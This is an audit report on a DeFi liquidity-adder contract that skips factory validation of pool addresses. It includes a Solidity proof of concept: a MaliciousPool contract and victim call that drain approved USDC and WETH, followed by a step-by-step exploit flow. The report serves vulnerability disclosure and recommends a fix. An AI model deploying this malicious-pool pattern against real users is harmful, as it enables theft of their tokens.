Audit Report

## Title
Missing Factory Pool Validation in `MetricOmmPoolLiquidityAdder` Allows Malicious Pool to Drain User Tokens — (File: `metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol`)

## Summary

`MetricOmmPoolLiquidityAdder` accepts an arbitrary `pool` address from the caller and stores it as the authoritative callback caller without verifying it against the factory registry. A malicious contract implementing the pool interface can be passed as `pool`, causing the callback to pull the victim's approved tokens directly to the attacker. The contract's own NatSpec explicitly documents this gap.

## Finding Description

`MetricOmmSwapRouterBase._setNextCallbackContext` enforces a factory check before storing any pool in transient context: [1](#0-0) 

`MetricOmmPoolLiquidityAdder` has no `FACTORY` immutable and performs no equivalent check. Its NatSpec at lines 19–21 explicitly documents the omission: [2](#0-1) 

`_addLiquidity` stores the unvalidated pool address as the expected callback caller and immediately calls `addLiquidity` on it: [3](#0-2) 

`metricOmmModifyLiquidityCallback` validates only that `msg.sender == expectedPool` (the same unvalidated address), checks amounts against user-supplied caps, reads token addresses from `IMetricOmmPool(msg.sender).getImmutables()`, and calls `pay()`: [4](#0-3) 

Every guard passes for a malicious pool because: (1) the malicious pool *is* the expected pool, (2) it controls the amounts it requests up to the caps, and (3) it controls what `getImmutables()` returns, including which token addresses are used in `pay()`.

## Impact Explanation

Direct loss of user principal. A victim who has approved `MetricOmmPoolLiquidityAdder` to spend token0 and token1 can have up to `maxAmountToken0` of token0 and `maxAmountToken1` of token1 transferred to the attacker's pool contract in a single transaction. Because users set these caps to the amounts they intend to deposit, the attacker can steal the full intended deposit. This meets the Critical/High threshold for direct loss of user principal.

## Likelihood Explanation

Medium. The attack requires the victim to call `addLiquidityExactShares` or `addLiquidityWeighted` with a malicious pool address. This is achievable via a phishing frontend, a malicious aggregator integration, or social engineering. Any user who has pre-approved the adder for significant token amounts is at risk. No privileged access is required by the attacker.

## Recommendation

Add a `FACTORY` immutable to `MetricOmmPoolLiquidityAdder` (mirroring `MetricOmmSwapRouterBase`) and call `_requireFactoryPool(pool)` inside `_addLiquidity` before `_setPayContext` is called: [5](#0-4) 

## Proof of Concept

```solidity
contract MaliciousPool {
    address adder;
    address token0; // e.g. USDC
    address token1; // e.g. WETH
    uint256 MAX0 = 1000e6;
    uint256 MAX1 = 1e18;

    function addLiquidity(address, uint80, LiquidityDelta calldata,
                          bytes calldata, bytes calldata)
        external returns (uint256, uint256)
    {
        // Callback with KIND_PAY, requesting full caps
        IMetricOmmPoolLiquidityAdder(adder)
            .metricOmmModifyLiquidityCallback(MAX0, MAX1, abi.encode(uint8(1)));
        return (MAX0, MAX1);
    }

    function getImmutables() external view returns (PoolImmutables memory) {
        return PoolImmutables({token0: token0, token1: token1, ...});
    }
}

// Victim (who approved adder for USDC and WETH) calls:
adder.addLiquidityExactShares(
    address(maliciousPool), victim, 0, deltas,
    1000e6, 1e18, ""
);
// Result: 1000 USDC + 1 WETH transferred from victim to maliciousPool
```

Exploit flow:
1. `_setPayContext(maliciousPool, victim, 1000e6, 1e18)` — stores malicious pool as expected caller
2. `maliciousPool.addLiquidity(...)` — attacker-controlled code runs
3. Attacker calls back `metricOmmModifyLiquidityCallback(1000e6, 1e18, abi.encode(KIND_PAY))`
4. `msg.sender == expectedPool` ✓ (both are `maliciousPool`)
5. `amount0Delta <= max0 && amount1Delta <= max1` ✓
6. `getImmutables()` returns USDC/WETH chosen by attacker
7. `pay(USDC, victim, maliciousPool, 1000e6)` — 1000 USDC stolen
8. `pay(WETH, victim, maliciousPool, 1e18)` — 1 WETH stolen

### Citations

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L29-32)
```text
  function _setNextCallbackContext(address pool, uint8 callbackMode, address payer, address tokenToPay) internal {
    _requireFactoryPool(pool);
    TransientCallbackPool.set(pool, callbackMode, payer, tokenToPay);
  }
```

**File:** metric-periphery/contracts/base/MetricOmmSwapRouterBase.sol (L87-89)
```text
  function _requireFactoryPool(address pool) internal view {
    if (!FACTORY.isPool(pool)) revert IMetricOmmSimpleRouter.InvalidPool(pool);
  }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L19-21)
```text
/// @dev The caller is responsible for supplying a legitimate pool address and other non-malicious parameters.
///      This contract does not verify the pool against the factory; a malicious pool can request token pulls up to
///      the caller-provided max caps during callback settlement.
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L162-177)
```text
    (address expectedPool, address payer, uint256 max0, uint256 max1) = _loadPayContext();
    if (expectedPool == address(0)) revert CallbackContextNotActive();
    if (msg.sender != expectedPool) revert InvalidCallbackCaller(msg.sender, expectedPool);
    if (amount0Delta > max0 || amount1Delta > max1) {
      revert MaxAmountExceeded(amount0Delta, amount1Delta, max0, max1);
    }

    PoolImmutables memory imm = IMetricOmmPool(msg.sender).getImmutables();
    address token0 = imm.token0;
    address token1 = imm.token1;
    if (amount0Delta > 0) {
      pay(token0, payer, msg.sender, amount0Delta);
    }
    if (amount1Delta > 0) {
      pay(token1, payer, msg.sender, amount1Delta);
    }
```

**File:** metric-periphery/contracts/MetricOmmPoolLiquidityAdder.sol (L193-195)
```text
    _setPayContext(pool, payer, maxAmountToken0, maxAmountToken1);
    try IMetricOmmPoolActions(pool)
      .addLiquidity(positionOwner, salt, deltas, abi.encode(KIND_PAY), extensionData) returns (
```
